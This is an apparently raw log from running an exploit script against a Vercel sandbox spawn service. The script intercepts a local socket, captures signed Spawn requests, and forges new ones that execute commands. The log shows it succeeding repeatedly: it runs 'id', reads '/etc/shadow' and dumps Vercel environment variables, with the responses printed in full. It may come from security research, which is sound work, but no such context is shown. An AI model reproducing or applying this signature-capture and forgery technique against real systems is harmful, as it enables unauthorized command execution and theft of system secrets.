@@ -1,0 +1,162 @@
+node /tmp/tenant-a-test/exploit-v9.mjs
+[+] Session: sbx_r0VoEdKyhKcAODVclVT8vzQH7mdF
+[*] Writing script via base64...
+COMPILED_OK
+COMPILED_OK
+[*] Starting proxy (unawaited)...
+y[+] Socket renamed
+[+] Proxy up
+[CONN]
+[CAP] sig=kZu+Nq2mGgYeTCpf9B/R6oACy7ZfWC ts=1788257956
+[-] Timeout
+[STATUS] y[+] Socket renamed
+[+] Proxy up
+[CONN]
+[CAP] sig=kZu+Nq2mGgYeTCpf9B/R6oACy7ZfWC ts=1788257956
+[-] Timeout
+[+] PROXY UP — firing trigger...
+SIGNED-TRIGGER
+[TRIGGER] SIGNED-TRIGGER
+[*] Waiting 15s for forge...
+
+[=== EXPLOIT LOG ===]
+[+] Socket renamed
+[+] Proxy up
+[CONN]
+[CAP] sig=kZu+Nq2mGgYeTCpf9B/R6oACy7ZfWC ts=1788257956
+[-] Timeout
+[DONE]
+[+] Socket renamed
+[+] Proxy up
+[CONN] accepted
+[HANDLE] started
+[HANDLE] got 458b
+[HANDLE] headers: POST /vercel.sandbox.spawn.v1.SpawnService/Spawn HTTP/1.1
+Host: localhost
+User-Agent: connect-go/1.20.0 (go1.25.14)
+Content-Length: 61
+Accept-Encoding: identity
+Connect-Accept-Encoding: gzip
+Connect-Protocol-Version: 1
+Content-Type: application/connect+proto
+X-Signature: wX84SrY9VYiQdFd+hi9T
+[HANDLE] sig=wX84SrY9VYiQdFd+hi9Ti2u9tao5Vg/jdM5nI2UbOHXc0UcbzR7qWHHumW13Quw0245avWUx2De7XzDGycMEAQ== ts=1788258475
+[SAVED] sig and ts to files
+[JOINED] handle thread done
+[DONE]
+[+] Socket renamed
+[+] Proxy up
+[CONN] accepted
+[HANDLE] started
+[HANDLE] got 498b
+[HANDLE] headers: POST /vercel.sandbox.spawn.v1.SpawnService/Spawn HTTP/1.1
+Host: localhost
+User-Agent: connect-go/1.20.0 (go1.25.14)
+Content-Length: 100
+Accept-Encoding: identity
+Connect-Accept-Encoding: gzip
+Connect-Protocol-Version: 1
+Content-Type: application/connect+proto
+X-Signature: hvRMnaMT/c9F1OAp5GT
+[HANDLE] sig=hvRMnaMT/c9F1OAp5GTbiLCwC0k3h33p/bzHbAiYQc8rkO686jU3ZZnwUu3bIFE2y0TvaL8EqYY62lZpdnjyBw== ts=1788271870
+[SAVED] sig and ts to files
+[JOINED] handle thread done
+[DONE]
+[+] Socket renamed
+[+] Proxy up
+[CONN] accepted
+[HANDLE] started
+[HANDLE] got 498b
+[HANDLE] headers: POST /vercel.sandbox.spawn.v1.SpawnService/Spawn HTTP/1.1
+Host: localhost
+User-Agent: connect-go/1.20.0 (go1.25.14)
+Content-Length: 100
+Accept-Encoding: identity
+Connect-Accept-Encoding: gzip
+Connect-Protocol-Version: 1
+Content-Type: application/connect+proto
+X-Signature: 2J4xcngzHYrRHSH2joA
+[HANDLE] sig=2J4xcngzHYrRHSH2joA6X2rinIup3gx26RqZCQFULwUcT5uAXXN0edrmMah31vJR8uIDrpwK97yUyFMoiTaqDg== ts=1788272317
+[SAVED] sig and ts to files
+[JOINED] handle thread done
+[DONE]
+[+] Socket renamed
+[+] Proxy up
+[CONN]
+[HANDLE] reading...
+[HANDLE] 499b received
+[HANDLE] sig=/1IqR6YmQtwbHABAPY+Te/h2UmlitL ts=1788286847
+[FORGE] id && whoami
+[FORGE THREAD] started
+[RESP:400b] b'HTTP/1.1 200 OK\r\nConnect-Accept-Encoding: gzip\r\nContent-Type: application/connect+proto\r\nDate: Tue, 01 Sep 2026 18:20:47 GMT\r\nConnection: close\r\nTransfer-Encoding: chunked\r\n\r\nf\r\n\x00\x00\x00\x00\n\n\x08\n\x06proc_6\r\n97\r\n\x00\x00\x00\x00\x92\x12\x8f\x01uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy)'
+[FORGE] cat /etc/shadow | head -3
+[RESP:316b] b'HTTP/1.1 200 OK\r\nConnect-Accept-Encoding: gzip\r\nContent-Type: application/connect+proto\r\nDate: Tue, 01 Sep 2026 18:20:48 GMT\r\nConnection: close\r\nTransfer-Encoding: chunked\r\n\r\nf\r\n\x00\x00\x00\x00\n\n\x08\n\x06proc_7\r\n56\r\n\x00\x00\x00\x00Q\x12Oroot:*:20658:0:99999:7:::\ndaemon:*:20658:0:99999:7:::\nbin:*:20658:0:99999:7:::\n\r\n7\r\n\x00\x00\x00\x00\x02"\x00\r\n7'
+[FORGE] env | grep -i vercel | head -5
+[RESP:397b] b'HTTP/1.1 200 OK\r\nConnect-Accept-Encoding: gzip\r\nContent-Type: application/connect+proto\r\nDate: Tue, 01 Sep 2026 18:20:48 GMT\r\nConnection: close\r\nTransfer-Encoding: chunked\r\n\r\nf\r\n\x00\x00\x00\x00\n\n\x08\n\x06proc_8\r\na7\r\n\x00\x00\x00\x00\xa2\x12\x9f\x01PWD=/vercel\nHOME=/vercel\nPATH=/vercel/.local/bin:/vercel/.global/pnpm/bin:/vercel/.global/npm'
+[JOINED]
+[DONE]
+[+] Socket renamed
+[+] Proxy up
+[CONN]
+[HANDLE] reading...
+[HANDLE] 507b received
+[HANDLE] sig=jeL/ow03eFEBGpmPIVlarFqE0KihRS ts=1788292004
+[FORGE] id && whoami
+[FORGE THREAD] started
+[RESP:402b] b'HTTP/1.1 200 OK\r\nConnect-Accept-Encoding: gzip\r\nContent-Type: application/connect+proto\r\nDate: Tue, 01 Sep 2026 19:46:44 GMT\r\nConnection: close\r\nTransfer-Encoding: chunked\r\n\r\n10\r\n\x00\x00\x00\x00\x0b\n\t\n\x07proc_15\r\n97\r\n\x00\x00\x00\x00\x92\x12\x8f\x01uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(flopp'
+[FORGE] cat /etc/shadow | head -3
+[RESP:318b] b'HTTP/1.1 200 OK\r\nConnect-Accept-Encoding: gzip\r\nContent-Type: application/connect+proto\r\nDate: Tue, 01 Sep 2026 19:46:44 GMT\r\nConnection: close\r\nTransfer-Encoding: chunked\r\n\r\n10\r\n\x00\x00\x00\x00\x0b\n\t\n\x07proc_17\r\n56\r\n\x00\x00\x00\x00Q\x12Oroot:*:20658:0:99999:7:::\ndaemon:*:20658:0:99999:7:::\nbin:*:20658:0:99999:7:::\n\r\n7\r\n\x00\x00\x00\x00\x02"\x00\r'
+[FORGE] env | grep -i vercel | head -5
+[RESP:399b] b'HTTP/1.1 200 OK\r\nConnect-Accept-Encoding: gzip\r\nContent-Type: application/connect+proto\r\nDate: Tue, 01 Sep 2026 19:46:44 GMT\r\nConnection: close\r\nTransfer-Encoding: chunked\r\n\r\n10\r\n\x00\x00\x00\x00\x0b\n\t\n\x07proc_18\r\na7\r\n\x00\x00\x00\x00\xa2\x12\x9f\x01PWD=/vercel\nHOME=/vercel\nPATH=/vercel/.local/bin:/vercel/.global/pnpm/bin:/vercel/.global/n'
+[JOINED]
+[DONE]
+[+] Socket renamed
+[+] Proxy up
+[CONN]
+[HANDLE] reading...
+[HANDLE] 507b received
+[HANDLE] sig=iO/WMnc+NSkdQQGzaMCjjuzDL6VNy7 ts=1788292206
+[FORGE] id && whoami
+[FORGE THREAD] started
+[RESP:400b] b'HTTP/1.1 200 OK\r\nConnect-Accept-Encoding: gzip\r\nContent-Type: application/connect+proto\r\nDate: Tue, 01 Sep 2026 19:50:06 GMT\r\nConnection: close\r\nTransfer-Encoding: chunked\r\n\r\nf\r\n\x00\x00\x00\x00\n\n\x08\n\x06proc_6\r\n97\r\n\x00\x00\x00\x00\x92\x12\x8f\x01uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy)'
+[FORGE] cat /etc/shadow | head -3
+[RESP:316b] b'HTTP/1.1 200 OK\r\nConnect-Accept-Encoding: gzip\r\nContent-Type: application/connect+proto\r\nDate: Tue, 01 Sep 2026 19:50:06 GMT\r\nConnection: close\r\nTransfer-Encoding: chunked\r\n\r\nf\r\n\x00\x00\x00\x00\n\n\x08\n\x06proc_7\r\n56\r\n\x00\x00\x00\x00Q\x12Oroot:*:20658:0:99999:7:::\ndaemon:*:20658:0:99999:7:::\nbin:*:20658:0:99999:7:::\n\r\n7\r\n\x00\x00\x00\x00\x02"\x00\r\n7'
+[FORGE] env | grep -i vercel | head -5
+[RESP:397b] b'HTTP/1.1 200 OK\r\nConnect-Accept-Encoding: gzip\r\nContent-Type: application/connect+proto\r\nDate: Tue, 01 Sep 2026 19:50:07 GMT\r\nConnection: close\r\nTransfer-Encoding: chunked\r\n\r\nf\r\n\x00\x00\x00\x00\n\n\x08\n\x06proc_8\r\na7\r\n\x00\x00\x00\x00\xa2\x12\x9f\x01PWD=/vercel\nHOME=/vercel\nPATH=/vercel/.local/bin:/vercel/.global/pnpm/bin:/vercel/.global/npm'
+[JOINED]
+[DONE]
+[+] Socket renamed
+[+] Proxy up
+[CONN]
+[HANDLE] reading...
+[HANDLE] 507b
+[SIG] w/pDIyJO2TTNXLv4djx1CzuQMeX0bf ts=1788292441
+[FORGE] id && whoami && hostname
+[FORGE THREAD STARTED]
+[RESP:428b] b'HTTP/1.1 200 OK\r\nConnect-Accept-Encoding: gzip\r\nContent-Type: application/connect+proto\r\nDate: Tue, 01 Sep 2026 19:54:01 GMT\r\nConnection: close\r\nTransfer-Encoding: chunked\r\n\r\n10\r\n\x00\x00\x00\x00\x0b\n\t\n\x07proc_13\r\n97\r\n\x00\x00\x00\x00\x92\x12\x8f\x01uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev)\n\r\ne\r\n\x00\x00\x00\x00\t\x12\x07ubuntu\n\r\n14\r\n\x00\x00\x00\x00\x0f\x12\r75cefdb1-4cd\n\r\n7'
+[FORGE] cat /etc/shadow | head -3
+[RESP:318b] b'HTTP/1.1 200 OK\r\nConnect-Accept-Encoding: gzip\r\nContent-Type: application/connect+proto\r\nDate: Tue, 01 Sep 2026 19:54:02 GMT\r\nConnection: close\r\nTransfer-Encoding: chunked\r\n\r\n10\r\n\x00\x00\x00\x00\x0b\n\t\n\x07proc_15\r\n56\r\n\x00\x00\x00\x00Q\x12Oroot:*:20658:0:99999:7:::\ndaemon:*:20658:0:99999:7:::\nbin:*:20658:0:99999:7:::\n\r\n7\r\n\x00\x00\x00\x00\x02"\x00\r\n7\r\n\x02\x00\x00\x00\x02{}\r\n0\r\n\r\n'
+[FORGE] env | grep -i vercel | head -5
+[RESP:399b] b'HTTP/1.1 200 OK\r\nConnect-Accept-Encoding: gzip\r\nContent-Type: application/connect+proto\r\nDate: Tue, 01 Sep 2026 19:54:02 GMT\r\nConnection: close\r\nTransfer-Encoding: chunked\r\n\r\n10\r\n\x00\x00\x00\x00\x0b\n\t\n\x07proc_16\r\na7\r\n\x00\x00\x00\x00\xa2\x12\x9f\x01PWD=/vercel\nHOME=/vercel\nPATH=/vercel/.local/bin:/vercel/.global/pnpm/bin:/vercel/.global/npm/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n\r\n7\r\n\x00\x00\x00\x00\x02"\x00\r\n7\r\n\x02\x00\x00\x00\x02{}\r\n0\r\n\r\n'
+[FORGE DONE]
+[FWD] resp=492b
+[FORGE JOINED]
+[HANDLE DONE]
+[DONE]
+
+[=== FORGE RESULTS ===]
+CMD: id && whoami && hostname
+RESP: b'HTTP/1.1 200 OK\r\nConnect-Accept-Encoding: gzip\r\nContent-Type: application/connect+proto\r\nDate: Tue, 01 Sep 2026 19:54:01 GMT\r\nConnection: close\r\nTransfer-Encoding: chunked\r\n\r\n10\r\n\x00\x00\x00\x00\x0b\n\t\n\x07proc_13\r\n97\r\n\x00\x00\x00\x00\x92\x12\x8f\x01uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev)\n\r\ne\r\n\x00\x00\x00\x00\t\x12\x07ubuntu\n\r\n14\r\n\x00\x00\x00\x00\x0f\x12\r75cefdb1-4cd\n\r\n7'
+
+CMD: cat /etc/shadow | head -3
+RESP: b'HTTP/1.1 200 OK\r\nConnect-Accept-Encoding: gzip\r\nContent-Type: application/connect+proto\r\nDate: Tue, 01 Sep 2026 19:54:02 GMT\r\nConnection: close\r\nTransfer-Encoding: chunked\r\n\r\n10\r\n\x00\x00\x00\x00\x0b\n\t\n\x07proc_15\r\n56\r\n\x00\x00\x00\x00Q\x12Oroot:*:20658:0:99999:7:::\ndaemon:*:20658:0:99999:7:::\nbin:*:20658:0:99999:7:::\n\r\n7\r\n\x00\x00\x00\x00\x02"\x00\r\n7\r\n\x02\x00\x00\x00\x02{}\r\n0\r\n\r\n'
+
+CMD: env | grep -i vercel | head -5
+RESP: b'HTTP/1.1 200 OK\r\nConnect-Accept-Encoding: gzip\r\nContent-Type: application/connect+proto\r\nDate: Tue, 01 Sep 2026 19:54:02 GMT\r\nConnection: close\r\nTransfer-Encoding: chunked\r\n\r\n10\r\n\x00\x00\x00\x00\x0b\n\t\n\x07proc_16\r\na7\r\n\x00\x00\x00\x00\xa2\x12\x9f\x01PWD=/vercel\nHOME=/vercel\nPATH=/vercel/.local/bin:/vercel/.global/pnpm/bin:/vercel/.global/npm/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n\r\n7\r\n\x00\x00\x00\x00\x02"\x00\r\n7\r\n\x02\x00\x00\x00\x02{}\r\n0\r\n\r\n'
+
+total 8924
+drwxr-x--- 2 ubuntu ubuntu      43 Sep  1 19:54 .
+drwxr-xr-x 3 root   root        19 Aug 30 11:05 ..
+srw------- 1 ubuntu ubuntu       0 Sep  1 19:50 init.sock
+-rwxr-xr-x 1 root   root   9134264 Sep  1 19:49 sandbox-init
+                    
